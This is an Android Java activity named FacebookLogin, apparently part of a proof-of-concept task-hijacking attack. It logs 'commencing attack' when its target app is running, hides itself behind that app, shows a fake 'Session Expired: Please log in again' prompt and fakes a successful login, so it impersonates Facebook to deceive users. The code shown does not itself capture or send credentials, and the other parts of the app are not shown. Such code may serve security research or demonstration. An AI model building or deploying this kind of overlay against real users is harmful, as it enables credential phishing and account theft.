package com.example.transparentactivity;

import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import java.util.Objects;

public class FacebookLogin extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_facebook_login);
        Objects.requireNonNull(getSupportActionBar()).setDisplayShowTitleEnabled(false);
        if (getSupportActionBar() != null) {
            getSupportActionBar().hide();
        }

        if (isTaskRoot()) {
            Log.i(MainActivity.TAG, "Target not running... closing activity");
            moveTaskToBack(false);
            finish();
        }

        else {
            Log.i(MainActivity.TAG, "Target running... commencing attack");
            moveTaskToBack(true);
        }
    }

    @Override
    protected void onRestart() {
        Toast.makeText(this, "Session Expired: Please log in again", Toast.LENGTH_LONG).show();
        super.onRestart();
    }

    public void loginButton(View view) {
        Toast.makeText(this, "Log in successful", Toast.LENGTH_LONG).show();

        finish();
    }
}